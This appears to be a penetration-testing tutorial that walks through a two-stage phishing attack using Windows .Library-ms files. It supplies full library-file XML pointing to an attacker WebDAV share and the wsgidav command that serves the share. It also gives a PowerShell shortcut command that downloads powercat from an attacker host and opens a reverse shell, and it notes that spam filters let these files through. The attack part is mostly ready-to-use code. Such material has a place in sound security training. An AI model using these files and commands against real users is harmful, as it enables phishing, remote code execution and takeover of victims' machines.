# Obtaining Code Execution via Windows Library Files


Windows library files are virtual containers for user content.

They connect users with data stored in remote locations like web services or shares.

These files have a `.Library-ms` file extension and can be executed by double-clicking them in Windows Explorer.




## Two-stage client-side attack

1.
In the first stage, we'll use Windows library files to gain a foothold on the target system and set up the second stage.

First, we'll create a Windows library file connecting to a WebDAV share we'll set up. 

The victim receives a `.Library-ms` file, perhaps via email. When they double-click the file, it will appear as a regular directory in Windows Explorer.

In the WebDAV directory, we'll provide a payload in the form of a `.lnk` shortcut file for the second stage to execute a PowerShell reverse shell. We must convince the user to double-click our `.lnk` payload file to execute it.

The difference between serving the file like this vs. via an Apache web server is that is bypass the filters. Spam filters and security technologies will pass Windows library files directly to the user. When they double-click the file, Windows Explorer displays the contents of the remote location as if it were a local directory.


Create `config.Library-ms`:

Library files consist of three parts:
- General library information
- Library properties
- Library locations

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://[WEBDAV SHARE URL]</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Create the shortcut file:
The goal is to start a reverse shell by putting the `.lnk` shortcut file on the WebDAV share for the victim to execute.


Right-click on the desktop and click on `New` > `Shortcut`. In the Create Shortcut window, we can enter a path to a program along with arguments, which will be pointed to by the shortcut. Point the shortcut to PowerShell and use another download cradle to load PowerCat from the Kali machine and start a reverse shell.

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[ATTACKER MACHINE]:8000/powercat.ps1');
powercat -c 192.168.119.3 -p 4444 -e powershell"
```








```
mkdir /home/[USERNAME]/webdav

/home/[USERNAME]/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/[USERNAME]/webdav/
```


2.
In the second stage, we'll use the foothold to provide an executable file that will start a reverse shell when double-clicked.

